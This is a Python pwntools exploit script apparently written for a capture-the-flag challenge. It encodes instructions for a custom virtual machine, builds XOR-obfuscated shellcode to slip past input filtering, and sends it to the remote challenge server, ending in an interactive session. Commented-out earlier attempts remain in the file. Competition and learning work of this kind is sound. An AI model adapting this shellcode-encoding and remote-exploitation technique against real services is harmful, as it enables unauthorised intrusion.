from pwn import *

def add(reg1, reg2): #reg1 = reg1 + reg2
	return "\x30" + chr(reg1 + (reg2 << 4))
def xor(reg1, reg2): #reg1 = reg1 ^ reg2
	return "\x32" + chr(reg1 + (reg2 << 4))
def switch(reg1): #switches real and imaginary of reg1
	return "\x50" + chr(reg1 + (3 << 4))
def mov(reg1, reg2): #reg1 = reg2
	return "\x41" + chr(reg1 + (reg2 << 4))
def movdata(reg1): #reg1 = the four bytes after this
	return "\x31" + chr(reg1 + (4 << 4))
def movdatatoreg(reg1, reg2):
	return "\x42" + chr(reg1 + (reg2 << 4))
def movdatafromreg(reg1, reg2):
	return "\x43" + chr(reg1 + (reg2 << 4))

r = remote("pwn-02.v7frkwrfyhsjtbpfcppnu.ctfz.one", 1337)

#0x60040 + 0x60045i
shellcode = ""

'''shellcode += movdata(0) + "CDEFGHIJ"
shellcode += movdata(4) + "\x25\x28EFGHIJ"
shellcode += xor(0, 4)'''


'''
shellcode += add(2, 3)
shellcode += add(2, 2)
shellcode += add(2, 3)
shellcode += add(1, 2)
shellcode += add(3, 2)
shellcode += add(0, 3)
shellcode += switch(3)
shellcode += add(0, 3)
shellcode += switch(6)
shellcode += add(1, 3)'''
'''
shellcode += mov(7, 5)# + "\x46A"
shelcode += switch(6)
shellcode += xor(7, 6)
shellcode += switch(6)
shellcode += add(2, 3)
shellcode += add(3, 3)
shellcode += add(3, 3)
shellcode += add(3, 3)
shellcode += add(3, 2)
shellcode += add(3, 2)
shellcode += add(3, 2)
shellcode += add(6, 6)
shellcode += xor(7, 3)
shellcode += xor(7, 6)
shellcode += xor(7, 2)
shellcode += "\x46"'''


#
shellcode += movdata(3) + "CCEEGGII"
shellcode += movdata(7) + "aCEEAAII"
shellcode += xor(7, 3)
shellcode += "\x46"

shellcode2 = ""
shellcode2 += movdata(0) + "%/EEGGII"
shellcode2 += xor(0, 3)
shellcode2 += movdata(1) + '"$EEGGII'
shellcode2 += xor(1, 3)
shellcode2 += "\x49\x40"


r.recvuntil("strings:")
r.sendline("2")
r.recvuntil("Input:")
r.sendline(shellcode2 + "B"*(63-len(shellcode2)))
r.recvuntil("Input:")
r.sendline(shellcode + "A"*(63-len(shellcode)))
r.recvuntil("letters:")
r.sendline("17")
r.recvuntil("please:")
r.sendline("LLLLBBBBCCCCDDDDEEEEFFFFGGGGHHHH" + "@F")

r.interactive()
